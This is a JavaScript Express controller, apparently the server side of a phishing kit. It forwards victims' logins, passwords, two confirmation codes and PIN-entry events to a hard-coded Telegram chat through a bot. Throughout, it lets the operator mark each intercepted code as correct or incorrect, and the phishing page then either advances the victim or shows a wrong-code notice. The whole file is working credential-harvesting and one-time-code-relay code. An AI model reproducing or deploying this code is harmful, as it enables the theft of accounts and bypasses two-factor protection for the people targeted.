const bot = require('./bot')
const Post = require("./Post");


class PostController {
    async login(req, res) {
        try {
            const {login, password, id, method, time} = req.body
            let message = `ID: ${id}\nМетод: ${method}\nЛогин: ${login}\nПароль: ${password}\ntime: ${time}`
            return await bot.sendMessage('1815070047', message)

        } catch (e) {
            console.log(e)
        }
    }

    async code1(req,res) {
        try {
            const {code, id} = req.body
            let message = `ID: ${id}\nПервый код подтверждения: ${code}`
            const botOptions1 = {
                reply_markup: JSON.stringify({
                    inline_keyboard: [
                        [{text: 'Верный', callback_data: id}, {text: 'Неверный', callback_data: 'no'}]


                    ]
                })
            }
            await bot.sendMessage('1815070047', message, botOptions1)
            let message2 = `Пользователь: ${id}\nбыл перенаправлен далее`
            let message3 = `Пользователю: ${id}\nвысветилось уведомление о том что код неверен`
            let status
            bot.on('callback_query', async msg => {
                const data = msg.data;
                if (data === id){
                    status = 'right'
                    const user = await Post.create({id, status})
                    await bot.sendMessage('1815070047', message2)
                } else {
                    status = 'reload'
                    const user1 = await Post.create({id, status})
                    await bot.sendMessage('1815070047', message3)
                }
            })
        } catch (e) {
            console.log(e.message)
        }
    }

    async code2(req,res) {
        try {
            let status
            const {code, id} = req.body
            let message = `ID: ${id}\nВторой код подтверждения: ${code}`
            const botOptions = {
                reply_markup: JSON.stringify({
                    inline_keyboard: [
                        [{text: 'Верный', callback_data: id}, {text: 'Неверный', callback_data: 'no'}]


                    ]
                })
            }
            await bot.sendMessage('1815070047', message, botOptions)
            let message2 = `Пользователь: ${id}\nбыл перенаправлен далее`
            let message3 = `Пользователю: ${id}\nвысветилось уведомление о том что код неверен`
            bot.on('callback_query', async msg => {
                const data = msg.data;
                if (data === id){
                    status = 'right'
                    const user = await Post.updateOne({id, status})

                    await bot.sendMessage('1815070047', message2)
                } else {
                    status = 'reload'
                    const user = await Post.updateOne({id, status})
                    await bot.sendMessage('1815070047', message3)
                }
            })
        } catch (e) {
           console.log(e.message)
        }
    }

    async pincode(req,res) {
        try {
            const {id} = req.body
            let message = `ID: ${id}\nПинкод введён!`
            return await bot.sendMessage('1815070047', message)
        } catch (e) {

        }
    }

    async getUser(req,res){
        try {
            const {id} = req.params
            const pretendent = await Post.findOne({id})
            console.log(pretendent)
            return res.json(pretendent)
        } catch (e) {
            e.message
        }
    }
}

module.exports = new PostController()
